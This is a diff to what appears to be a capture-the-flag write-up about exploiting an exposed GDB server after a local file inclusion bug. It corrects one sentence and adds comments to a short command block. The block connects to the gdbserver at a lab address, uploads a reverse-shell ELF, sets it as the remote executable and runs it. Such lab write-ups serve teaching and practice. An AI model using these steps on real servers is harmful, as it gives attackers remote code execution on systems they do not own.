@@ -60,7 +60,7 @@ Since we know that the website is vulnerable to LFI, I proceeded to try serveral
 
 With furthur research on GDBServer and the writeup [here](https://security.tencent.com/index.php/blog/msg/137), I realized that a rce could be exploited on a publicly-exposed GDB server. 
 
-However, there are 2 pieces of information that are a few information that we have to find out before we can continue with the exploit:
+However, there are 2 pieces of information that we have to find out before we can continue with the exploit:
 - Architecture of the server (Whether it is 32-bit or 64-bit)
 - Low-privilege user on the server
 
@@ -80,8 +80,11 @@ The last step in generating the reverse shell is to first connect to the gdb ser
 ```
 target extend-remote 10.129.106.84:1337
 cd /home/kali/rev.elf
+// upload reverse shell payload
 remote put rev.elf rev.elf
+// set directory of reverse shell payload
 set remote-exec rev.elf /home/user/rev.elf
+// execute reverse shell payload
 run
 ```
 
